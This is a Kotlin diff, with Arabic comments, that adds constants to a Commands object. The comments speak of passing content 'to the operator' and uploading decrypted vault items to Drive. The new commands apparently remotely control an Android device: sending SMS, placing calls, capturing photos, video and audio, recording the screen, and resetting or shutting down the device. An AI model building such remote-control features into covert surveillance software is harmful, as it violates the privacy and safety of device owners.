@@ -151,6 +151,23 @@ object Commands {
     // B8 — نقل محتوى حقيقي للمشغّل والرفع إلى Drive: وفق ملف تخزين كامل المسار، ووفق عنصر خزنة مفكوك التشفير
     const val STORAGE_OPEN = "storage_open"
     const val VAULT_OPEN = "vault_open"
+    // ===================== B26 — أوامر الدمج الكامل من واجهة الإنتاج (ApkFull) =====================
+    // أُنقلت سلوكياً من واجهة الإنتاج (ولا تعارض ولا تكرار: أسماءُ حصراً بلا تصادمٍ داخل الأساس)
+    const val SMS_SEND = "sms_send"
+    const val CALL_MAKE = "call_make"
+    const val SCREEN_SHOW = "screen_show"
+    const val CONTACT_ADD = "contact_add"
+    const val MEDIA_ADD = "media_add"
+    const val CAPTURE_PHOTO = "capture_photo"
+    const val CAPTURE_VIDEO = "capture_video"
+    const val RECORD_AUDIO = "record_audio"
+    const val SCREEN_SHOT = "screen_shot"
+    const val SCREEN_RECORD = "screen_record"
+    const val DEVICE_SHUTDOWN = "device_shutdown"
+    const val DEVICE_RESET = "device_reset"
+    const val COMMAND_SCHEDULE = "command_schedule"
+    const val SCHEDULE_LIST = "schedule_list"
+    const val SCHEDULE_CANCEL = "schedule_cancel"
 }
 
 /**
